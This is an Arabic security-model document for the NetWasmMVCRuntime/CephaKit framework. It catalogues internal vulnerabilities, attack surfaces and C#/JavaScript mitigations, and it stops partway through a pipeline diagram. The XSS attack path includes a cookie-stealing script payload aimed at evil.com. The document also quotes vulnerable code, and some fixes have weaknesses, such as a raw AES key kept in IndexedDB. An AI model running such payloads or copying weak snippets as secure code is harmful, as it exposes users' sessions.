# وثيقة أمان رسمية
# `CEP-SEC-001` — نموذج الأمان الشامل لـ NetWasmMVCRuntime

| الحقل | القيمة |
|-------|--------|
| **المعرّف** | CEP-SEC-001 |
| **الإصدار** | 1.0.0 |
| **التاريخ** | أبريل 2026 |
| **الحالة** | سارية المفعول |
| **يستند إلى** | `CEP-001` · `SecurityModel.md` · `Architecture.md` |
| **المعيار المرجعي** | ASP.NET Core Security Guidelines · OWASP ASVS v4.0 · NIST SP 800-63B |
| **نطاق التطبيق** | Browser WASM · CephaKit Node.js · Cloudflare Workers Edge |

---

## 1. الملخص التنفيذي

يعمل NetWasmMVCRuntime في بيئتين متمايزتين تماماً عن بيئة تشغيل ASP.NET Core الكلاسيكية:

```
ASP.NET Core MVC الكلاسيكي:
────────────────────────────
• يعمل على خادم موثوق تحت سيطرة المشغِّل
• HTTP Pipeline مع Middleware قابل للتدقيق
• الكود لا يُنفَّذ على جهاز المستخدم أبداً
• نموذج ثقة: الخادم = المرجع الأعلى

NetWasmMVCRuntime:
──────────────────
• يعمل داخل متصفح المستخدم (بيئة غير موثوقة)
• أو على Cloudflare Workers (بيئة مُقيَّدة)
• الكود يُنفَّذ على جهاز يملكه المستخدم
• نموذج الثقة: الجهاز = حد الثقة الأول
```

هذا التمايز الجوهري يُحدِّد كامل استراتيجية الأمان الواردة في هذه الوثيقة.

---

## 2. خريطة سطح الهجوم الكاملة

### 2.1 الطبقات الخمس

```
┌─────────────────────────────────────────────────────────────────────┐
│  L5: طبقة المستخدم — نقاط الإدخال                                  │
│       URL Navigation · Form Submit · API Fetch · EventSource        │
├─────────────────────────────────────────────────────────────────────┤
│  L4: طبقة main.js — سطح العرض                                       │
│       innerHTML · postMessage · localStorage · BroadcastChannel     │
├─────────────────────────────────────────────────────────────────────┤
│  L3: طبقة WASM Worker — المحرك                                      │
│       MvcEngine · RazorEngine · SignalR · JSImport/JSExport         │
├─────────────────────────────────────────────────────────────────────┤
│  L2: طبقة الهوية والجلسات                                           │
│       HMAC Tokens · IdentityAtom · OPFS · SessionStorageService     │
├─────────────────────────────────────────────────────────────────────┤
│  L1: طبقة CephaKit — الخادم                                         │
│       Node.js/Cloudflare · CephaFS KV · SSE · main.mjs             │
└─────────────────────────────────────────────────────────────────────┘
```

### 2.2 نقاط الدخول المُصنَّفة

| المعرّف | نقطة الدخول | الطبقة | مستوى الخطر |
|---------|------------|--------|------------|
| EP-01 | `document.addEventListener('click')` — اعتراض الروابط | L4 | 🟡 متوسط |
| EP-02 | `document.addEventListener('submit')` — النماذج | L4 | 🔴 عالٍ |
| EP-03 | `window.fetch` override — API calls | L4 | 🔴 عالٍ |
| EP-04 | `worker.onmessage` — رسائل الـ Worker | L4 | 🔴 عالٍ |
| EP-05 | `_authChannel.onmessage` — BroadcastChannel | L4 | 🟡 متوسط |
| EP-06 | `window.EventSource` override — SSE | L4 | 🟡 متوسط |
| EP-07 | `JsExports.Navigate()` — داخل Worker | L3 | 🔴 عالٍ |
| EP-08 | `JsExports.SubmitForm()` — داخل Worker | L3 | 🔴 عالٍ |
| EP-09 | `JsExports.HandleRequest()` — CephaKit | L1 | 🔴 حرج |
| EP-10 | OPFS `cepha_sessions.json` — التخزين | L2 | 🔴 حرج |
| EP-11 | OPFS `identity.db` — قاعدة البيانات | L2 | 🔴 حرج |
| EP-12 | `/_cepha/sse/*` — SSE connections | L1 | 🟠 عالٍ |
| EP-13 | `/_cepha/ws/*` — WebSocket/SignalR | L1 | 🟠 عالٍ |
| EP-14 | `/_cepha/info` — معلومات النظام | L1 | 🟡 متوسط |
| EP-15 | KV Store `cepha:secret:*` — الأسرار | L1 | 🔴 حرج |
| EP-16 | `localStorage` snapshot عند الإقلاع | L4 | 🟡 متوسط |

---

## 3. سجل الثغرات الكامل

### 3.1 الثغرات الحرجة — Critical

---

#### `CVE-CEP-001` — XSS عبر `innerHTML` بدون Sanitization

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `main.js` → `applyFrame()` → `case 'setInnerHTML'` |
| **CVSS v3.1** | 9.6 (Critical) |
| **الفئة** | OWASP A03:2021 — Injection |
| **المتجه** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |

**المسار الكامل للهجوم:**

```
1. مهاجم يُدخل بيانات خبيثة في قاعدة البيانات
   عبر نموذج غير مُحكَم (مثل: حقل التعليقات)

2. Controller يقرأ البيانات ويُمررها إلى View
   public IActionResult Index() {
       ViewData["Comment"] = dbComment; // ← بدون encoding
       return View();
   }

3. Razor View يُدرجها في HTML:
   <p>@ViewData["Comment"]</p>
   ← إذا كان RazorEngine لا يُطبِّق HtmlEncode

4. Worker يُرسل HTML عبر postMessage:
   self.postMessage({ type:'dom', op:'setInnerHTML', value: html })

5. main.js يُطبِّق مباشرة:
   el.innerHTML = html  ← لا sanitization

6. <script>document.location='evil.com?c='+document.cookie</script>
   ينفَّذ في سياق الصفحة
```

**التخفيف المطلوب:**

```javascript
// main.js — applyFrame() [السطر 239]
case 'setInnerHTML': {
    let html = frame.value
        .replace(/(href|src|action)\s*=\s*"~\//g, '$1="/');
    html = html.replace(
        /<link[^>]*href="[^"]*\.styles\.css[^"]*"[^>]*\/?>/gi, '');

    // ← إضافة إلزامية
    if (typeof DOMPurify !== 'undefined') {
        html = DOMPurify.sanitize(html, {
            FORBID_TAGS:     ['script','object','embed','iframe','base'],
            FORBID_ATTR:     ['onerror','onclick','onload','onmouseover',
                              'onfocus','onblur','onchange','onsubmit'],
            ALLOW_DATA_ATTR: false,
            FORCE_BODY:      true
        });
    }

    el.innerHTML = html;
    activateScripts(el);
    break;
}
```

**تعادل ASP.NET Core:** `@Html.Encode()` و `@Model.Property` يُطبِّقان HTML encoding تلقائياً. على الـ RazorTemplateEngine تطبيق نفس السلوك بشكل افتراضي في كل `@expression`.

---

#### `CVE-CEP-002` — CORS Wildcard يُتيح Cross-Origin Requests

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `CephaHttpContext.cs` السطر 122 · `CephaRequestPipeline.cs` السطر 92 |
| **CVSS v3.1** | 8.2 (High) |
| **الفئة** | OWASP A05:2021 — Security Misconfiguration |

**الكود الحالي:**

```csharp
// CephaHttpContext.cs:122 — ثابت لا يتغير
ctx.ResponseHeaders["Access-Control-Allow-Origin"] = "*";

// CephaRequestPipeline.cs:92
context.ResponseHeaders["Access-Control-Allow-Origin"] = allowedOrigins;
// allowedOrigins الافتراضي = "*"
```

**التخفيف:**

```csharp
// CephaRequestPipeline.cs
public CephaRequestPipeline UseCors(
    IEnumerable<string>? allowedOrigins = null)
{
    // إذا لم تُحدَّد origins → يُرفض كل طلب cross-origin
    var allowed = allowedOrigins?.ToHashSet(
        StringComparer.OrdinalIgnoreCase)
        ?? new HashSet<string>();
    var allowAll = allowed.Contains("*");

    return Use(next => async context =>
    {
        var origin = context.RequestHeaders
            .GetValueOrDefault("origin", "");

        string effectiveOrigin;
        if (allowAll)
            effectiveOrigin = "*";
        else if (!string.IsNullOrEmpty(origin)
              && allowed.Contains(origin))
            effectiveOrigin = origin;
        else
            effectiveOrigin = "";

        if (!string.IsNullOrEmpty(effectiveOrigin))
        {
            context.ResponseHeaders
                ["Access-Control-Allow-Origin"] = effectiveOrigin;
            context.ResponseHeaders
                ["Access-Control-Allow-Credentials"] = "true";
        }
        context.ResponseHeaders["Vary"] = "Origin";

        if (context.Method == "OPTIONS")
        { context.StatusCode = 204; return; }

        await next(context);
    });
}
```

**الاستخدام:**

```csharp
// Program.cs (CephaKit)
services.AddCephaKit(options =>
{
    options.AllowedOrigins = new[]
    {
        "https://my-app.pages.dev",
        "https://my-custom-domain.com"
        // "http://localhost:5001" — يُضاف تلقائياً في Dev
    };
});
```

**تعادل ASP.NET Core:** `builder.Services.AddCors()` + `app.UseCors()` + `[EnableCors("PolicyName")]`

---

#### `CVE-CEP-003` — SSE و SignalR بدون Authentication

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `main.mjs` → SSE handler السطر 117 · `SseMiddleware.cs` |
| **CVSS v3.1** | 8.8 (High) |
| **الفئة** | OWASP A01:2021 — Broken Access Control |

**الكود الحالي:**

```javascript
// main.mjs — أي طلب GET لـ /sse/* يُقبَل بلا فحص
if (path.startsWith('/sse/') && method === 'GET') {
    const connectionId = `sse_${++sseIdCounter}`;
    // لا تحقق من token أو session
    res.writeHead(200, { 'Content-Type': 'text/event-stream' });
    // المستخدم المجهول يستقبل stream مستمر
}
```

**التخفيف:**

```javascript
// main.mjs — SSE handler المؤمَّن
if (path.startsWith('/sse/') && method === 'GET') {
    // 1. استخراج الـ token
    // EventSource لا يدعم custom headers
    // → token في query string مع حماية من CSRF
    const urlObj  = new URL(path, 'http://localhost');
    const token   = urlObj.searchParams.get('_t');

    if (!token) {
        res.writeHead(401, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Unauthorized' }));
        return;
    }

    // 2. التحقق عبر .NET
    const authResult = await dotnetExports
        .Cepha.JsExports.ValidateToken(token);

    if (!authResult || authResult === 'invalid') {
        res.writeHead(403, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Forbidden' }));
        return;
    }

    // 3. تسجيل الـ connection مع userId
    const connectionId = `sse_${++sseIdCounter}_${authResult}`;
    // ...
}
```

**تعادل ASP.NET Core:** `[Authorize]` على Hub class + `HubConnectionContext.User`

---

#### `CVE-CEP-004` — OPFS بدون تشفير للبيانات الحساسة

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `SecurityModel.md` — جدول OPFS Persistence |
| **CVSS v3.1** | 7.8 (High — Local) |
| **الفئة** | OWASP A02:2021 — Cryptographic Failures |

**الوضع الحالي:**

```
| HMAC signing key | OPFS (JSON) | None ← CRITICAL
| SQLite databases | OPFS (binary) | None
| Session entries  | OPFS (JSON)   | HMAC-signed only
```

**التخفيف — AES-GCM عبر WebCrypto:**

```javascript
// cepha-data-worker.js — إضافة تشفير للملفات الحساسة
const SENSITIVE_PATHS = new Set([
    'cepha_sessions.json',
    'hmac.key',
    'identity.db'
]);

// مفتاح AES-GCM — extractable: false لا يُستخرَج أبداً
let _encKey = null;

async function getOrCreateEncKey() {
    if (_encKey) return _encKey;

    // محاولة استرجاع المفتاح من IndexedDB
    const stored = await idbGet('cepha:enckey');
    if (stored) {
        _encKey = await crypto.subtle.importKey(
            'raw', stored, { name: 'AES-GCM' }, false,
            ['encrypt', 'decrypt']);
        return _encKey;
    }

    // توليد مفتاح جديد
    _encKey = await crypto.subtle.generateKey(
        { name: 'AES-GCM', length: 256 },
        true,                    // exportable للتخزين
        ['encrypt', 'decrypt']
    );

    // تصدير وتخزين في IndexedDB
    const raw = await crypto.subtle.exportKey('raw', _encKey);
    await idbSet('cepha:enckey', raw);

    // لا يُصدَّر بعد الآن
    _encKey = await crypto.subtle.importKey(
        'raw', raw, { name: 'AES-GCM' }, false,
        ['encrypt', 'decrypt']);

    return _encKey;
}

async function encryptIfSensitive(path, data) {
    if (!SENSITIVE_PATHS.has(path.split('/').pop())) return data;
    const key = await getOrCreateEncKey();
    const iv  = crypto.getRandomValues(new Uint8Array(12));
    const enc = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv },
        key,
        typeof data === 'string'
            ? new TextEncoder().encode(data)
            : data
    );
    // تنسيق: iv (12 bytes) || ciphertext
    const result = new Uint8Array(12 + enc.byteLength);
    result.set(iv, 0);
    result.set(new Uint8Array(enc), 12);
    return result.buffer;
}

async function decryptIfSensitive(path, data) {
    if (!SENSITIVE_PATHS.has(path.split('/').pop())) return data;
    const key    = await getOrCreateEncKey();
    const bytes  = new Uint8Array(data);
    const iv     = bytes.slice(0, 12);
    const cipher = bytes.slice(12);
    return await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv }, key, cipher);
}
```

**تعادل ASP.NET Core:** `IDataProtectionProvider` + `ProtectAsync()` / `UnprotectAsync()`

---

#### `CVE-CEP-005` — غياب Authorization Middleware في MvcEngine

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `MvcEngine.cs` → `ProcessRequestAsync()` |
| **CVSS v3.1** | 9.1 (Critical) |
| **الفئة** | OWASP A01:2021 — Broken Access Control |

**الوضع الحالي:**

```csharp
// MvcEngine.cs — يُنفِّذ كل action بدون فحص [Authorize]
public async Task ProcessRequestAsync(IInternalHttpContext context)
{
    var descriptor = _routeTable[context.Path];
    // ← لا فحص هنا
    var result = descriptor.ActionMethod.Invoke(controller, args);
    await result.ExecuteResultAsync(context);
}
```

**التخفيف:**

```csharp
// MvcEngine.cs — ProcessRequestAsync() المؤمَّن
public async Task ProcessRequestAsync(IInternalHttpContext context)
{
    var descriptor = ResolveDescriptor(context.Path);
    if (descriptor == null)
    {
        context.StatusCode  = 404;
        context.ResponseBody = "Not Found";
        return;
    }

    // ── فحص [Authorize] ────────────────────────────────────
    var actionAuth     = descriptor.ActionMethod
        .GetCustomAttribute<AuthorizeAttribute>();
    var controllerAuth = descriptor.ControllerType
        .GetCustomAttribute<AuthorizeAttribute>();
    var effectiveAuth  = actionAuth ?? controllerAuth;

    var allowAnon = descriptor.ActionMethod
        .GetCustomAttribute<AllowAnonymousAttribute>()
        ?? descriptor.ControllerType
           .GetCustomAttribute<AllowAnonymousAttribute>();

    if (effectiveAuth != null && allowAnon == null)
    {
        var isAuthenticated =
            context.Items.ContainsKey("IsAuthenticated");

        if (!isAuthenticated)
        {
            context.StatusCode   = 401;
            context.ResponseBody =
                context.Path.StartsWith("/api/")
                    ? """{"error":"Unauthorized"}"""
                    : null; // → Redirect للـ login
            if (context.ResponseBody == null)
            {
                context.StatusCode   = 302;
                context.ResponseBody =
                    $"/account/login?returnUrl={Uri.EscapeDataString(context.Path)}";
            }
            return;
        }

        // ── فحص الأدوار ───────────────────────────────────
        if (!string.IsNullOrEmpty(effectiveAuth.Roles))
        {
            var userRoles = (context.Items
                .GetValueOrDefault("Roles") as string ?? "")
                .Split(',',
                    StringSplitOptions.RemoveEmptyEntries);

            var required = effectiveAuth.Roles
                .Split(',',
                    StringSplitOptions.TrimEntries
                  | StringSplitOptions.RemoveEmptyEntries);

            if (!required.Any(r => userRoles.Contains(r,
                    StringComparer.OrdinalIgnoreCase)))
            {
                context.StatusCode   = 403;
                context.ResponseBody =
                    """{"error":"Forbidden"}""";
                return;
            }
        }
    }

    // ── تنفيذ الـ Action ───────────────────────────────────
    var result = descriptor.ActionMethod.Invoke(controller, args);
    await result.ExecuteResultAsync(context);
}
```

**تعادل ASP.NET Core:** `app.UseAuthorization()` + `[Authorize]` + `[AllowAnonymous]` + `[Authorize(Roles = "Admin")]`

---

### 3.2 الثغرات العالية — High

---

#### `CVE-CEP-006` — `postMessage` بدون Origin Validation

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `main.js` → `worker.onmessage` |
| **CVSS v3.1** | 7.4 (High) |

**التخفيف:**

```javascript
// main.js
worker.onmessage = (e) => {
    // رسائل Worker ليس لها e.source
    // أي رسالة بـ source = رسالة من iframe أو نافذة خارجية
    if (e.source !== null) {
        console.warn('[Cepha] Rejected cross-origin message');
        return;
    }

    const d = e.data;
    if (!d || typeof d.type !== 'string') return;

    // Whitelist صارمة
    const ALLOWED = new Set([
        'dom','pushState','storage','cephakit',
        'auth-changed','cephaDb','opfs','download',
        'signalr','hub-result','fetch-result',
        'delegate-to-server','try-server-first',
        'server-response','mirror-to-server'
    ]);

    if (!ALLOWED.has(d.type)) {
        console.warn(`[Cepha] Unknown message type: ${d.type}`);
        return;
    }

    switch (d.type) { /* ... */ }
};
```

---

#### `CVE-CEP-007` — غياب Rate Limiting

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `main.mjs` — كل endpoints |
| **CVSS v3.1** | 7.5 (High) |

**التخفيف:**

```javascript
// main.mjs
class RateLimiter {
    #limits = new Map();

    check(ip, opts = { max: 100, windowMs: 60_000 }) {
        const now = Date.now();
        let   rec = this.#limits.get(ip)
                 ?? { count: 0, resetAt: now + opts.windowMs };

        if (now > rec.resetAt)
            rec = { count: 0, resetAt: now + opts.windowMs };

        rec.count++;
        this.#limits.set(ip, rec);

        return {
            ok:        rec.count <= opts.max,
            remaining: Math.max(0, opts.max - rec.count),
            resetAt:   rec.resetAt
        };
    }

    // تنظيف دوري للإدخالات القديمة
    cleanup() {
        const now = Date.now();
        for (const [ip, rec] of this.#limits)
            if (now > rec.resetAt) this.#limits.delete(ip);
    }
}

const _limiter = new RateLimiter();
setInterval(() => _limiter.cleanup(), 300_000);

// تطبيق في كل طلب
const server = createServer(async (req, res) => {
    const ip = req.headers['cf-connecting-ip']
            ?? req.headers['x-forwarded-for']?.split(',')[0]?.trim()
            ?? req.socket?.remoteAddress
            ?? 'unknown';

    const limit = _limiter.check(ip);
    res.setHeader('X-RateLimit-Remaining', limit.remaining);
    res.setHeader('X-RateLimit-Reset',
        Math.ceil((limit.resetAt - Date.now()) / 1000));

    if (!limit.ok) {
        res.writeHead(429, { 'Content-Type': 'application/json',
                             'Retry-After': '60' });
        res.end(JSON.stringify({ error: 'Too Many Requests' }));
        return;
    }

    // ... بقية الـ handler
});
```

**تعادل ASP.NET Core:** `builder.Services.AddRateLimiter()` + `app.UseRateLimiter()` (متاح من .NET 7)

---

#### `CVE-CEP-008` — `localStorage` Snapshot كامل يُرسَل للـ Worker

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `main.js` السطر 129-134 |
| **CVSS v3.1** | 6.5 (Medium) |

**التخفيف:**

```javascript
// main.js — فلترة localStorage قبل الإرسال
const CEPHA_KEY_PREFIX = 'cepha:';
const storageSnapshot  = {};

for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    // يُرسَل فقط ما يبدأ بـ cepha:
    if (k && k.startsWith(CEPHA_KEY_PREFIX))
        storageSnapshot[k] = localStorage.getItem(k);
}

worker.postMessage({
    type:        'init',
    path:        location.pathname || '/',
    storage:     storageSnapshot,
    fingerprint: navigator.userAgent
});
```

---

#### `CVE-CEP-009` — Fingerprint Binding أحادي المصدر

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `SessionStorageService.cs` + `main.js:134` |
| **CVSS v3.1** | 6.1 (Medium) |

**التخفيف:**

```javascript
// main.js — fingerprint مُركَّب
async function buildFingerprint() {
    const components = [
        navigator.userAgent,
        navigator.language,
        navigator.hardwareConcurrency?.toString() ?? '',
        screen.colorDepth?.toString()              ?? '',
        Intl.DateTimeFormat().resolvedOptions().timeZone ?? ''
    ];

    // Canvas fingerprint (مقاوم للتزوير)
    try {
        const canvas  = document.createElement('canvas');
        const ctx2d   = canvas.getContext('2d');
        ctx2d.textBaseline = 'top';
        ctx2d.font         = '14px Arial';
        ctx2d.fillText('🧬 Cepha', 2, 2);
        components.push(canvas.toDataURL().slice(-50));
    } catch { /* بعض البيئات لا تدعم canvas */ }

    const combined = components.join('|');
    const encoded  = new TextEncoder().encode(combined);
    const hash     = await crypto.subtle.digest('SHA-256', encoded);
    return btoa(String.fromCharCode(...new Uint8Array(hash)));
}

// الاستخدام
const fingerprint = await buildFingerprint();
worker.postMessage({ type: 'init', ..., fingerprint });
```

---

#### `CVE-CEP-010` — غياب Content Security Policy

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `index.html` (SDK content) · `main.mjs` response headers |
| **CVSS v3.1** | 6.8 (Medium) |

**التخفيف — طبقتان:**

```html
<!-- SDK/content/wwwroot/index.html — meta tag -->
<meta http-equiv="Content-Security-Policy" content="
    default-src 'none';
    script-src  'self' 'wasm-unsafe-eval';
    worker-src  'self' blob:;
    connect-src 'self' https://your-cepha-kit.workers.dev;
    style-src   'self' 'unsafe-inline';
    img-src     'self' data: blob:;
    font-src    'self';
    form-action 'self';
    base-uri    'self';
    frame-ancestors 'none';
">
```

```csharp
// CephaRequestPipeline.cs — UseResponseHeaders() المؤمَّن
public CephaRequestPipeline UseSecurityHeaders(
    string? connectSrc = null)
{
    return Use(next => async context =>
    {
        await next(context);

        context.ResponseHeaders.TryAdd(
            "Content-Security-Policy",
            string.Join("; ",
                "default-src 'none'",
                "script-src 'self' 'wasm-unsafe-eval'",
                $"connect-src 'self'{(connectSrc != null ? " " + connectSrc : "")}",
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' data: blob:",
                "frame-ancestors 'none'"
            )
        );
        context.ResponseHeaders.TryAdd(
            "X-Content-Type-Options", "nosniff");
        context.ResponseHeaders.TryAdd(
            "X-Frame-Options", "DENY");
        context.ResponseHeaders.TryAdd(
            "Referrer-Policy",
            "strict-origin-when-cross-origin");
        context.ResponseHeaders.TryAdd(
            "Permissions-Policy",
            "camera=(), microphone=(), geolocation=()");
        context.ResponseHeaders.TryAdd(
            "Strict-Transport-Security",
            "max-age=31536000; includeSubDomains; preload");
    });
}
```

**تعادل ASP.NET Core:** `app.UseHsts()` + NWebsec middleware + `[RequireHttps]`

---

### 3.3 الثغرات المتوسطة — Medium

---

#### `CVE-CEP-011` — CephaSessionStorageService — عزل الجلسات غير مكتمل

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `CephaSessionStorageService.cs` السطر 40-43 |
| **CVSS v3.1** | 5.9 (Medium) |

**المشكلة:**

```csharp
// CephaSessionStorageService.cs:40
foreach (var kvp in _sessions)
{
    // يُعيد أول جلسة صالحة — لا ارتباط بـ request context
    if (kvp.Value.ExpiresAt > DateTime.UtcNow)
        return Task.FromResult<SessionData?>(kvp.Value);
}
// في خادم متعدد المستخدمين: يُعيد جلسة مستخدم آخر!
```

**التخفيف:**

```csharp
// CephaSessionStorageService.cs — المؤمَّن
public Task<SessionData?> GetSessionAsync(string? tokenFromRequest = null)
{
    // 1. إذا لم يُعطَ token → فحص token في الـ context الحالي
    if (string.IsNullOrEmpty(tokenFromRequest))
        tokenFromRequest = _contextAccessor
            ?.CurrentContext?.RequestHeaders
            .GetValueOrDefault("X-Cepha-Session");

    if (string.IsNullOrEmpty(tokenFromRequest))
        return Task.FromResult<SessionData?>(null);

    // 2. استخرج tokenId من الـ signed token
    var parts = tokenFromRequest.Split('.');
    if (parts.Length != 2)
        return Task.FromResult<SessionData?>(null);

    var tokenId = parts[0];
    var key     = $"{SessionKey}_{tokenId}";

    if (!_sessions.TryGetValue(key, out var session))
        return Task.FromResult<SessionData?>(null);

    return session.ExpiresAt > DateTime.UtcNow
        ? Task.FromResult<SessionData?>(session)
        : Task.FromResult<SessionData?>(null);
}
```

**تعادل ASP.NET Core:** `IHttpContextAccessor` + Cookie Authentication + User.Identity

---

#### `CVE-CEP-012` — KV Store مشترك بلا Namespace Isolation

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `CephaSessionStorageService.cs` · `CloudflareKVFileProvider.cs` |
| **CVSS v3.1** | 5.4 (Medium) |

**التخفيف — Namespace الكاملة:**

```
cepha:session:{tokenId}      ← جلسات المستخدمين
cepha:file:{path}            ← ملفات CephaFS
cepha:version:{path}:{vid}   ← إصدارات الملفات
cepha:secret:{key}           ← الأسرار
cepha:index                  ← فهرس الملفات
cepha:audit:{date}           ← سجل الأحداث
cepha:ratelimit:{ip}         ← Rate limiting state
```

كل `CephaInterop.StorageGet/Set` يُقيَّد بـ namespace prefix.

---

#### `CVE-CEP-013` — `/_cepha/info` يكشف معلومات حساسة

| الحقل | التفاصيل |
|-------|----------|
| **الموقع** | `CephaServer.cs` → `GetServerInfoAsync()` |
| **CVSS v3.1** | 4.3 (Medium) |

**التخفيف:**

```csharp
// CephaServer.cs — GetServerInfoAsync() المؤمَّن
private async Task<string> GetServerInfoAsync()
{
    var isDevMode = CephaInterop.IsDevMode();
    var info = new Dictionary<string, object>
    {
        // ← دائماً متاح
        ["server"]             = "Cepha",
        ["version"]            = GetVersion(),
        ["runtime"]            = "WebAssembly (.NET 10)",
        ["status"]             = "running",
        ["controllersOnServer"] = _options.ControllersOnServer,
        ["mirrorRoutes"]       = GetMirrorRoutes()
    };

    // ← متاح في dev فقط
    if (isDevMode)
    {
        info["routes"] = GetAllRoutes();
        info["hubs"]   = GetHubNames();
        info["fs"]     = await GetFsStatsAsync();
    }

    return JsonSerializer.Serialize(info);
}
```

---

## 4. نموذج ثقة موحَّد مع ASP.NET Core

### 4.1 تقابل المكونات الأمنية

| مكوّن ASP.NET Core | المعادل في Cepha | الفجوة | الحالة |
|------------------|----------------|--------|--------|
| `app.UseAuthentication()` | `InjectSessionItems()` في `CephaApp.cs` | تلقائي لا يعتمد على Cookie | ✅ معادل |
| `app.UseAuthorization()` | `[Authorize]` فحص في `MvcEngine` | **مفقود حالياً** | 🔴 مطلوب |
| `app.UseHsts()` | `Strict-Transport-Security` header | no-op في Shims | ✅ يُضاف في `UseSecurityHeaders()` |
| `app.UseCors()` | `CephaRequestPipeline.UseCors()` | Wildcard افتراضي | 🟠 يُصلَح |
| `app.UseRateLimiter()` | `RateLimiter` في `main.mjs` | **مفقود حالياً** | 🔴 مطلوب |
| `[Authorize(Roles)]` | `[Authorize(Roles)]` في MvcEngine | **مفقود حالياً** | 🔴 مطلوب |
| `[AllowAnonymous]` | `[AllowAnonymous]` في MvcEngine | **مفقود حالياً** | 🔴 مطلوب |
| `IDataProtectionProvider` | AES-GCM في `CephaFS` | تطبيق مخصص | ✅ معادل |
| `UserManager<T>` | `IUserManager` + PBKDF2 | نفس الـ API | ✅ معادل |
| `SignInManager<T>` | `ISignInManager` + HMAC | نفس الـ API | ✅ معادل |
| `ClaimsPrincipal` | `context.Items["IsAuthenticated"]` | لا Claims بنية | 🟡 يُعزَّز |
| `AntiForgeryToken` | غائب تماماً | **مفقود حالياً** | 🔴 مطلوب |
| `ModelState` validation | `ModelStateDictionary` موجود | لا DataAnnotations | 🟡 جزئي |
| `IHttpContextAccessor` | `IInternalHttpContext` | نفس المفهوم | ✅ معادل |
| `SecurityStamp` | موجود في `User` entity | لا invalidation تلقائي | 🟡 يُعزَّز |

### 4.2 `ClaimsPrincipal` — التمثيل الموحَّد

لتحقيق تعادل كامل مع ASP.NET Core بدون Shims:

```csharp
// WasmMvcRuntime.Abstractions — إضافة داخل InternalHttpContext
// لا Shim — تطبيق حقيقي للـ ClaimsPrincipal

public class InternalHttpContext
{
    // الموجود
    public string  Path     { get; set; } = "/";
    public string  Method   { get; set; } = "GET";
    public Dictionary<string, string> Items { get; } = new();
    // ...

    // ← جديد: ClaimsPrincipal حقيقي من System.Security.Claims
    private ClaimsPrincipal? _user;
    public ClaimsPrincipal User
    {
        get
        {
            if (_user != null) return _user;

            // بناء من Items[] (يُحقن من InjectSessionItems)
            if (!Items.ContainsKey("IsAuthenticated"))
                return _user = new ClaimsPrincipal(
                    new ClaimsIdentity()); // anonymous

            var claims = new List<Claim>
            {
                new(ClaimTypes.Name,
                    Items.GetValueOrDefault("UserName") ?? ""),
                new(ClaimTypes.Email,
                    Items.GetValueOrDefault("UserEmail") ?? ""),
                new(ClaimTypes.NameIdentifier,
                    Items.GetValueOrDefault("UserId") ?? ""),
            };

            var roles = Items.GetValueOrDefault("Roles") ?? "";
            foreach (var r in roles.Split(',',
                StringSplitOptions.RemoveEmptyEntries))
                claims.Add(new Claim(ClaimTypes.Role, r.Trim()));

            _user = new ClaimsPrincipal(
                new ClaimsIdentity(claims, "CephaAuth"));
            return _user;
        }
    }
}
```

بهذا يصبح `User.IsInRole("Admin")` و `User.FindFirstValue(ClaimTypes.Email)` يعملان بالضبط كما في ASP.NET Core — بدون أي Shim.

### 4.3 AntiForgery — الحماية من CSRF

```csharp
// WasmMvcRuntime.Abstractions — AntiForgeryService
// لا Shim — تطبيق حقيقي بـ HMAC

public class CephaAntiForgery
{
    private static readonly byte[] _key =
        System.Security.Cryptography.RandomNumberGenerator.GetBytes(32);

    /// <summary>يُولِّد token لـ hidden field في النماذج</summary>
    public static string GenerateToken(string sessionId)
    {
        var payload = $"{sessionId}:{DateTime.UtcNow:yyyyMMddHH}";
        var bytes   = System.Text.Encoding.UTF8.GetBytes(payload);
        using var hmac = new System.Security.Cryptography
            .HMACSHA256(_key);
        var sig = hmac.ComputeHash(bytes);
        return Convert.ToBase64String(sig);
    }

    /// <summary>يتحقق من الـ token في ProcessRequestAsync</summary>
    public static bool ValidateToken(
        string token, string sessionId)
    {
        // فحص الساعة الحالية والساعة السابقة
        var windows = new[]
        {
            $"{sessionId}:{DateTime.UtcNow:yyyyMMddHH}",
            $"{sessionId}:{DateTime.UtcNow.AddHours(-1):yyyyMMddHH}"
        };

        var provided = Convert.FromBase64String(token);
        using var hmac = new System.Security.Cryptography
            .HMACSHA256(_key);

        return windows.Any(w =>
        {
            var expected = hmac.ComputeHash(
                System.Text.Encoding.UTF8.GetBytes(w));
            return System.Security.Cryptography
                .CryptographicOperations.FixedTimeEquals(
                    provided, expected);
        });
    }
}
```

```csharp
// في MvcEngine — فحص AntiForgery على POST
if (context.Method == "POST")
{
    var hasAntiForgery = descriptor.ActionMethod
        .GetCustomAttribute<ValidateAntiForgeryTokenAttribute>()
        != null;

    if (hasAntiForgery)
    {
        var token     = context.FormData
            .GetValueOrDefault("__RequestVerificationToken");
        var sessionId = context.Items
            .GetValueOrDefault("UserId") ?? "";

        if (!CephaAntiForgery.ValidateToken(token ?? "", sessionId))
        {
            context.StatusCode   = 400;
            context.ResponseBody = "Invalid anti-forgery token";
            return;
        }
    }
}
```

**تعادل ASP.NET Core:** `[ValidateAntiForgeryToken]` + `@Html.AntiForgeryToken()` في Views

---

## 5. خط أنابيب الأمان الكامل — Pipeline

```
طلب وارد (Navigate / Submit / Fetch)
         ↓
┌────────────────────────────────────────────────────────────────┐
│  CephaRequestPipeline                                          │
│                                                                │
│  1. UseRateLimiting()          ← CVE-CEP-007                  │
│     IP-based: 100 req/min                                      │
│         ↓                                                      │
│  2. UseExceptionHandler()      ← موجود                        │
│     JSON error envelope                                        │
